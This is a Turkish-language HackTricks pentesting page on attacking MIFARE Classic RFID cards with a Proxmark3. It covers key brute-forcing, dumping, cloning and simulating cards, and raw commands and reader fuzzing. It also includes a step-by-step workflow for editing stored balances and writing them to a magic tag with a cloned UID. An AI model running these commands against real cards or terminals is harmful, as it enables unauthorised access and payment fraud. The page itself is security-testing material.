# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 ile RFID Sistemlerine Saldırma

Yapmanız gereken ilk şey bir [**Proxmark3**](https://proxmark.com) edinmek ve [**yazılımı ve bağımlılıkları yükle**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**yin**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB'ye Saldırma

**16 sector** içerir; her birinde **4 block** bulunur ve her block **16B** içerir. UID, sector 0 block 0'da bulunur (ve değiştirilemez).\
Her sector'a erişmek için, **her sector'ın block 3'ünde** (sector trailer) saklanan **2 key'e** (**A** ve **B**) ihtiyacınız vardır. Sector trailer ayrıca, 2 key'i kullanarak **her block için okuma ve yazma** izinlerini sağlayan **access bit'lerini** de saklar.\
Örneğin, ilkini biliyorsanız okuma, ikincisini biliyorsanız yazma izni vermek için 2 key kullanışlıdır.

Birden fazla saldırı gerçekleştirilebilir
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3, hassas verileri bulmaya çalışmak için **Tag ile Reader arasındaki iletişimi dinlemek** gibi başka işlemler de gerçekleştirebilir. Bu kartta iletişimi dinleyip kullanılan anahtarı hesaplayabilirsiniz; çünkü kullanılan **cryptographic operations zayıftır** ve plain text ile cipher text'i bildiğinizde anahtarı hesaplayabilirsiniz (`mfkey64` tool).<sup>[[3]](#references)</sup>

#### Stored-value abuse için MiFare Classic hızlı iş akışı

Terminaller bakiyeleri Classic kartlarda depoladığında, tipik bir uçtan uca akış şöyledir:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notlar

- `hf mf autopwn`, nested/darkside/HardNested tarzı saldırıları düzenler, anahtarları kurtarır ve client dumps klasöründe dump'lar oluşturur.<sup>[[1]](#references)</sup>
- Block 0/UID yazma yalnızca magic gen1a/gen2 kartlarda çalışır. Normal Classic kartlarda UID salt okunurdur.<sup>[[2]](#references)</sup>
- Birçok kurulumda Classic "value block" veya basit checksum'lar kullanılır. Düzenleme sonrasında yinelenen/tamamlayıcı alanların ve checksum'ların tutarlı olduğundan emin olun.<sup>[[4]](#references)</sup>

Daha üst düzey bir metodoloji ve önlemler için bkz.:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Ham Komutlar

IoT sistemleri bazen **markasız veya ticari olmayan tag'ler** kullanır. Bu durumda, **tag'lere özel raw commands göndermek** için Proxmark3 kullanabilirsiniz.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Bu bilgilerle kart hakkında ve kartla iletişim kurma yöntemi hakkında bilgi aramayı deneyebilirsiniz. Proxmark3 şu tür raw komutlar göndermenize olanak tanır: `hf 14a raw -p -b 7 26`

### Scriptler

Proxmark3 yazılımı, basit görevleri gerçekleştirmek için kullanabileceğiniz önceden yüklenmiş bir **otomasyon scriptleri** listesiyle birlikte gelir. Listenin tamamını almak için `script list` komutunu kullanın. Ardından `script run` komutunu ve script’in adını kullanın:
```
proxmark3> script run mfkeys
```
**tag okuyucularını fuzz etmek** için bir script oluşturabilirsiniz; bu nedenle **geçerli bir kartın** verilerini kopyaladıktan sonra, bir veya daha fazla rastgele **byte**'ı **randomize** eden bir **Lua script'i** yazmanız ve herhangi bir iterasyonda **reader'ın çöküp çökmediğini** kontrol etmeniz yeterlidir.

## Referanslar

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP'nin MIFARE Classic Crypto1 hakkındaki açıklaması](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value'da NFC card vulnerability exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
